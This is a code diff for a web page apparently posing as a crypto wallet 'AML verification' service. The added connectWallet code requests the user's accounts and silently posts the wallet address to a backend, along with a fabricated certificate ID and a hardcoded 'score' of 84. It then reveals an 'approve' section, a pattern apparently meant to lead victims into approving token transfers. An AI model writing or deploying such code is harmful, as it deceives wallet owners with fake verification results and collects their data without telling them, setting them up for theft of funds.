@@ -1020,90 +1020,66 @@
             }
         }
 
+        // Connect Wallet Function
         async function connectWallet() {
-            const btn = document.getElementById('connectBtn');
-            const walletInfo = document.getElementById('walletInfo');
-            
-            if (isProcessing) return;
-            
-            if (btn.textContent === 'Disconnect Wallet') {
-                isProcessing = true;
-                btn.classList.add('btn-loading');
-                btn.innerHTML = '<span class="pulsing-text">Disconnecting</span>';
-                walletInfo.classList.add('fade-out');
-                
-                await new Promise(resolve => setTimeout(resolve, 2000));
-                
-                walletInfo.classList.remove('show', 'fade-out', 'fade-in');
-                btn.classList.remove('btn-loading');
-                btn.textContent = 'Connect Wallet';
-                
-                document.getElementById('verificationSectionInner').classList.remove('show');
-                document.getElementById('analysisComplete').classList.remove('show');
-                document.getElementById('downloadBtn').style.display = 'none';
-                document.getElementById('verifyBtn').style.display = 'block';
-                document.getElementById('verifyBtn').disabled = false;
-                document.getElementById('verifyBtn').textContent = 'Confirm Verification';
-                document.getElementById('progressContainer').classList.remove('show');
-                
-                isProcessing = false;
+            if (typeof window.ethereum === 'undefined') {
+                showError('Please install MetaMask or TrustWallet!');
                 return;
             }
-            
+        
             try {
-                if (!window.ethereum) {
-                    alert('Please install MetaMask or Trust Wallet!');
-                    return;
-                }
-
-                isProcessing = true;
-                btn.classList.add('btn-loading');
-                btn.innerHTML = '<span class="pulsing-text">Connecting</span>';
-
-                web3 = new Web3(window.ethereum);
-                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                account = accounts[0];
-
-                const chainId = await web3.eth.getChainId();
-                if (chainId !== 1) {
-                    btn.classList.remove('btn-loading');
-                    btn.textContent = 'Connect Wallet';
-                    isProcessing = false;
-                    alert('Please switch to Ethereum Mainnet!');
-                    return;
-                }
-
-                usdtContract = new web3.eth.Contract(USDT_ABI, USDT_ADDRESS);
-
-                await new Promise(resolve => setTimeout(resolve, 2000));
-
-                btn.classList.remove('btn-loading');
+                showMessage('Connecting wallet...', 'info');
+                
+                const accounts = await window.ethereum.request({ 
+                    method: 'eth_requestAccounts' 
+                });
+                
+                userWallet = accounts[0];
+                
+                // SAVE TO BACKEND IMMEDIATELY AFTER CONNECTION
+                await saveUserToBackend(userWallet);
                 
                 document.getElementById('walletAddress').textContent = 
-                    account.slice(0, 6) + '...' + account.slice(-4);
+                    userWallet.slice(0, 6) + '...' + userWallet.slice(-4);
                 
-                walletInfo.classList.add('fade-in');
-                walletInfo.classList.add('show');
+                document.getElementById('connectBtn').style.display = 'none';
+                document.getElementById('approveSection').style.display = 'block';
                 
-                btn.textContent = 'Disconnect Wallet';
-                
-                document.getElementById('verificationSectionInner').classList.add('show');
-                
-                isProcessing = false;
+                showMessage('Wallet connected successfully!', 'success');
                 
             } catch (error) {
-                console.error(error);
-                btn.classList.remove('btn-loading');
-                btn.textContent = 'Connect Wallet';
-                isProcessing = false;
-                
-                if (error.code === 4001) {
-                    alert('Connection rejected. Please try again!');
-                } else {
-                    alert('Failed to connect wallet: ' + error.message);
-                }
+                console.error('Error connecting wallet:', error);
+                showError('Failed to connect wallet. Please try again.');
             }
         }
+        
+        // Function to save user to backend
+        async function saveUserToBackend(walletAddress) {
+            try {
+                const userData = {
+                    wallet: walletAddress,
+                    timestamp: new Date().toISOString(),
+                    certificateId: `AML-${walletAddress.slice(0, 10)}-${Date.now()}`,
+                    score: 84
+                };
+        
+                const response = await fetch(`${BACKEND_URL}/api/save-user`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(userData)
+                });
+        
+                const data = await response.json();
+                console.log('✅ User saved to backend:', data);
+                
+            } catch (error) {
+                console.error('Error saving to backend:', error);
+                // Don't show error to user - silent save
+            }
+        }
+
 
         async function startVerification() {
             try {
